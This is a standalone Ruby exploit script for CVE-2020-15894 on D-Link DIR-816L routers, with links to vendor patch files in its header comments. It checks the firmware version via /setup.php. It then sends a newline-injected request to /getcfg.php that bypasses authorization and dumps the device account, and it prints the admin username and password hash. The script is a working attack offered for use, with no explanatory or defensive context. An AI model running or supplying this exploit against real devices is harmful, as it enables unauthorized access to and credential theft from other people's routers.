#!/usr/bin/env ruby
# ftp://FTP2.DLINK.COM/SECURITY_ADVISEMENTS/DIR-816L/DIR-816L_REVB_FIRMWARE_PATCH_2.06.B09_BETA.ZIP
# http://legacyfiles.us.dlink.com/DIR-816L/REVB/SECURITY_PATCHES/DIR-816L_REVB_FIRMWARE_PATCH_2.06.B01.ZIP

require 'rex'
require 'rexml/document'

host = ARGV[0]

def usage
 puts "[*] CVE-2020-15894 DLINK DIR-816L"
 puts "[*] #{$0} <host>"
 exit
end

usage if ARGV.size < 1

begin

sock = Rex::Proto::Http::Client.new(host, 
                                    port = 80, 
                                    context = {}, 
                                    ssl = false)


req = sock.request_raw(
{
	'uri'   => '/setup.php',
	'version' => '1.0',
	'method' => 'GET',
})

sock.send_request(req)
data = sock.read_response()

if data.body.include?('2.06beta') || data.body.include?('2.06')
 req = sock.request_raw(
 {
	'uri'   => '/getcfg.php?a=%0a_POST_SERVICES%3DDEVICE.ACCOUNT%0aAUTHORIZED_GROUP%3D1',
	'version' => '1.0',
	'method' => 'GET',
 })

 sock.send_request(req)
 data = sock.read_response()

 rawxml = REXML::Document.new(data.body)
 user = REXML::XPath.first(rawxml, '//name')
 passwd = REXML::XPath.first(rawxml, '//password')
 
 puts "[x] User: #{user[0]}"
 puts "[x] Hash: #{passwd[0]}"
else
 puts "[!] Not tested!"
end
rescue => e
 puts "[!] #{e.to_s}"
end
